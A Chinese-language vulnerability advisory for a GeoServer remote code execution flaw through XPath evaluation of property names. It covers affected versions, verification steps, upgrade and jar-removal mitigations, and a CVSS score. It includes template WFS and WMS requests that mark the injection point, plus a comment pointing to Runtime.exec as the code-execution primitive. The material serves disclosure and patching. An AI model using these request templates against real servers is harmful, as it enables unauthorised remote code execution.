验证漏洞存在方法
    - 通过WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic或WPS Execute请求发送特制的XPath表达式
    - 尝试在属性名参数中注入XPath表达式，观察是否能够执行任意代码
    - 检查目标GeoServer版本是否在受影响范围内（2.22.6以下、2.23.6以下、2.24.4以下、2.25.2以下）

漏洞利用方法
    - 该漏洞存在于GeoTools库中，该库在处理属性名时错误地将其作为XPath表达式进行评估
    - 攻击者可以通过多个OGC请求参数（如WFS、WMS、WPS请求中的属性名参数）注入恶意XPath表达式
    - 由于commons-jxpath库的不安全使用，这些XPath表达式可以执行任意Java代码
    - 漏洞影响所有默认安装的GeoServer实例，包括简单特征类型
    
    - **PoC示例（通用模板）**：
    ```
    # WFS GetFeature请求示例
    POST /geoserver/wfs HTTP/1.1
    Host: target-geoserver
    Content-Type: text/xml
    
    <?xml version="1.0"?>
    <wfs:GetFeature service="WFS" version="1.1.0"
      xmlns:wfs="http://www.opengis.net/wfs"
      xmlns:ogc="http://www.opengis.net/ogc"
      xmlns:gml="http://www.opengis.net/gml">
      <wfs:Query typeName="namespace:featuretype">
        <ogc:Filter>
          <ogc:PropertyIsEqualTo>
            <ogc:PropertyName>恶意XPath表达式注入点</ogc:PropertyName>
            <ogc:Literal>value</ogc:Literal>
          </ogc:PropertyIsEqualTo>
        </ogc:Filter>
      </wfs:Query>
    </wfs:GetFeature>
    
    # WMS GetMap请求示例
    GET /geoserver/wms?service=WMS&version=1.1.0&request=GetMap
      &layers=layer&styles=&bbox=minx,miny,maxx,maxy
      &width=800&height=600&srs=EPSG:4326
      &format=image/png&FILTER=<Filter><PropertyIsEqualTo>
        <PropertyName>恶意XPath表达式注入点</PropertyName>
        <Literal>value</Literal>
      </PropertyIsEqualTo></Filter> HTTP/1.1
    Host: target-geoserver
    
    # 注意：实际利用需要构造能够执行代码的特定XPath表达式
    # 例如：java.lang.Runtime.getRuntime().exec("command")
    ```

**影响版本**：
- GeoServer < 2.22.6
- GeoServer < 2.23.6  
- GeoServer < 2.24.4
- GeoServer < 2.25.2

**修复方案**：
1. 升级到安全版本：2.22.6、2.23.6、2.24.4或2.25.2
2. 临时缓解：从GeoServer中移除gt-complex-x.y.jar文件（如gt-complex-31.1.jar）

**CVSS评分**：9.8（CRITICAL）
